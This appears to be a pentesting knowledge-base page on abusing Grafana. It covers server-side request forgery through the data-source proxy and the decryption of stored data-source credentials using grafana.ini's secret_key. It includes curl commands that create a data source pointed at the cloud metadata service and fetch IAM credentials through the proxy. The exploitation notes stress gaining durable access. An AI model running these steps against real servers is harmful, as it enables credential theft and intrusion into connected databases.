---
title: "Data source SSRF and credentials: abusing Grafana's connections"
description: "Grafana proxies queries to its data sources through the server, which an attacker with access turns into server-side request forgery to reach internal services, and Grafana stores the data-source credentials (encrypted with a key in grafana.ini). Recovering and decrypting those credentials gives direct access to the databases and services Grafana connects to."
keywords:
  - grafana ssrf
  - data source proxy
  - stored credentials
  - secret_key
  - internal services
---

# Data source SSRF and credentials

Two related data-source attacks follow from access to Grafana. First, the data-source proxy: Grafana queries data sources from the server side (so the browser never contacts them directly), and an attacker who can configure or query a data source directs those requests at arbitrary internal addresses, a server-side request forgery that reaches internal services from the Grafana host (cloud metadata, internal APIs, databases). Second, the stored credentials: Grafana saves each data source's credentials in its database, encrypted with the `secret_key` from `grafana.ini`. An attacker who reads the database and the key (through [path traversal](path-traversal-file-read.md), file access, or admin export) decrypts them to the plaintext credentials for every connected database and service, direct access to what Grafana visualizes, which is often the crown-jewel data stores.

```bash
# SSRF: point a data source (or a proxied query) at an internal target via the Grafana server
#   create/edit a data source with url=http://169.254.169.254/... or an internal service,
#   then query it; Grafana fetches it server-side and returns the response
curl -sk -b cj -X POST https://<target>:3000/api/datasources -H 'Content-Type: application/json' \
  -d '{"name":"x","type":"prometheus","url":"http://169.254.169.254/latest/meta-data/","access":"proxy"}'
curl -sk -b cj 'https://<target>:3000/api/datasources/proxy/<id>/latest/meta-data/iam/security-credentials/'
# stored credentials: data_source table secrets are AES-encrypted with secret_key (grafana.ini)
#   recover grafana.db + secret_key, then decrypt the secureJsonData / password fields
```

## Exploitation notes

- The proxy SSRF reaches anything the Grafana server can (cloud metadata for instance credentials, internal-only services, database ports); `access: proxy` data sources are fetched server-side, so this bypasses network restrictions on the attacker.
- The stored data-source credentials are the bigger prize: decrypting them with the `secret_key` gives direct logins to the databases and services (often the primary data stores) Grafana connects to, no SSRF needed.
- Recovering the DB and key is done via [path traversal](path-traversal-file-read.md), file access from code execution, or an admin-level export; the decryption uses Grafana's known AES scheme keyed by `secret_key`.
- Both routes turn a Grafana foothold into access to the wider environment it integrates with; prioritise the credential decryption for durable access.

## References

- [Grafana: data source permissions and proxy](https://grafana.com/docs/grafana/latest/administration/data-source-management/)
- [HackTricks: Grafana SSRF/credentials](https://book.hacktricks.xyz/network-services-pentesting/3000-pentesting-grafana)
